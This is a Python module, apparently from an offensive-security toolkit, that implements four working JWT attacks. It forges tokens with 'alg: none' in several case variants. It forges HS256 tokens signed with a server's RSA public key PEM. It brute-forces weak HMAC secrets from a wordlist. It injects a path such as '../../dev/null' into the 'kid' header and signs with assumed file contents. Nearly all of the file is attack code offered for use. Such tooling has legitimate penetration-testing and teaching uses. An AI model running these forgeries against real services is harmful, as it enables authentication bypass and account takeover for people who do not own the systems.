"""JWT algorithm-confusion and weak-secret attacks.

Modes:
  - ``"alg_none"`` — forge a token with ``alg: none`` and empty signature.
  - ``"hs_rs_swap"`` — given a token signed with RS256 and the server's RSA
    public key, forge an HS256 token using the public key PEM bytes as the
    HMAC secret (server-side misconfig: ``verify(token, key)`` treats the
    public key as a shared secret when the parsed header says HS256).
  - ``"weak_secret"`` — try to brute-force a small HS* secret against a
    wordlist (list of strings).
  - ``"kid_inject"`` — swap the ``kid`` to point at a known file path (e.g.
    ``../../dev/null`` or a path whose contents are known) and sign with
    the corresponding "secret".
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
from typing import Any

import jwt as pyjwt

from ._common import safe_result


def _b64url_decode(s: str) -> bytes:
    s = s + "=" * ((4 - len(s) % 4) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _split(token: str) -> tuple[dict[str, Any], dict[str, Any], bytes, str, str]:
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("token must have three dot-separated parts")
    header_b64, payload_b64, sig_b64 = parts
    header = json.loads(_b64url_decode(header_b64))
    payload = json.loads(_b64url_decode(payload_b64))
    sig = _b64url_decode(sig_b64)
    return header, payload, sig, header_b64, payload_b64


def _mutate_payload(payload: dict[str, Any], mutations: dict[str, Any]) -> dict[str, Any]:
    out = dict(payload)
    out.update(mutations)
    return out


def _hmac_digest(alg: str, key: bytes, msg: bytes) -> bytes:
    h = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    if alg not in h:
        raise ValueError(f"unsupported HMAC alg '{alg}'")
    return hmac.new(key, msg, h[alg]).digest()


@safe_result
def attack(
    mode: str,
    token: str,
    **params: Any,
) -> dict[str, Any]:
    header, payload, sig, h_b64, p_b64 = _split(token)
    mutations = params.get("mutations") or {}
    new_payload = _mutate_payload(payload, mutations) if mutations else payload

    if mode == "alg_none":
        # Try a handful of case variants — some libraries only reject exact "none".
        variants = ["none", "None", "NONE", "nOne"]
        forged: list[dict[str, str]] = []
        for alg in variants:
            new_header = dict(header)
            new_header["alg"] = alg
            h_new = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
            p_new = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
            forged.append({"alg_tried": alg, "token": f"{h_new}.{p_new}."})
        return {"ok": True, "mode": "alg_none", "forged_tokens": forged}

    if mode == "hs_rs_swap":
        pubkey_pem = params.get("public_key_pem")
        if not pubkey_pem:
            return {"ok": False, "reason": "public_key_pem required for hs_rs_swap"}
        new_header = dict(header)
        new_header["alg"] = params.get("target_alg", "HS256")
        h_new = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p_new = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
        msg = f"{h_new}.{p_new}".encode()
        secret_bytes = (
            pubkey_pem.encode("utf-8") if isinstance(pubkey_pem, str) else pubkey_pem
        )
        digest = _hmac_digest(new_header["alg"], secret_bytes, msg)
        sig_b64 = _b64url_encode(digest)
        return {
            "ok": True,
            "mode": "hs_rs_swap",
            "forged_token": f"{h_new}.{p_new}.{sig_b64}",
            "target_alg": new_header["alg"],
            "note": "HMAC key = public-key PEM bytes verbatim. Try alternate forms (DER, with/without trailing newline) if the server rejects.",
        }

    if mode == "weak_secret":
        wordlist = params.get("wordlist")
        if not isinstance(wordlist, list):
            return {"ok": False, "reason": "wordlist (list[str]) required"}
        alg = header.get("alg", "HS256")
        if not alg.startswith("HS"):
            return {"ok": False, "reason": f"token alg '{alg}' is not HMAC-family"}
        msg = f"{h_b64}.{p_b64}".encode()
        for word in wordlist[:200_000]:
            key = word.encode("utf-8") if isinstance(word, str) else word
            try:
                candidate = _hmac_digest(alg, key, msg)
            except ValueError:
                return {"ok": False, "reason": f"unsupported alg '{alg}'"}
            if hmac.compare_digest(candidate, sig):
                return {
                    "ok": True,
                    "mode": "weak_secret",
                    "secret": word,
                    "alg": alg,
                    "tried": wordlist.index(word) + 1,
                }
        return {
            "ok": False,
            "reason": f"secret not found in wordlist ({len(wordlist)} tried)",
        }

    if mode == "kid_inject":
        # Overwrite 'kid' with an attacker-controlled value. Sign with
        # the "known contents" of that file (operator supplies `key_bytes`).
        kid = params.get("kid", "../../dev/null")
        key_bytes = params.get("key_bytes", "")
        if isinstance(key_bytes, str):
            key_bytes = key_bytes.encode("utf-8")
        alg = params.get("target_alg", "HS256")
        new_header = dict(header)
        new_header["alg"] = alg
        new_header["kid"] = kid
        h_new = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
        p_new = _b64url_encode(json.dumps(new_payload, separators=(",", ":")).encode())
        msg = f"{h_new}.{p_new}".encode()
        digest = _hmac_digest(alg, key_bytes, msg)
        sig_b64 = _b64url_encode(digest)
        return {
            "ok": True,
            "mode": "kid_inject",
            "forged_token": f"{h_new}.{p_new}.{sig_b64}",
            "injected_kid": kid,
            "assumed_file_contents_len": len(key_bytes),
        }

    return {"ok": False, "reason": f"unknown mode '{mode}'"}


# pyjwt is imported to confirm its availability in the sandbox; keeping the
# reference here prevents the linter from removing the import even though
# we implement signing by hand for bit-exact header control.
_ = pyjwt.__version__
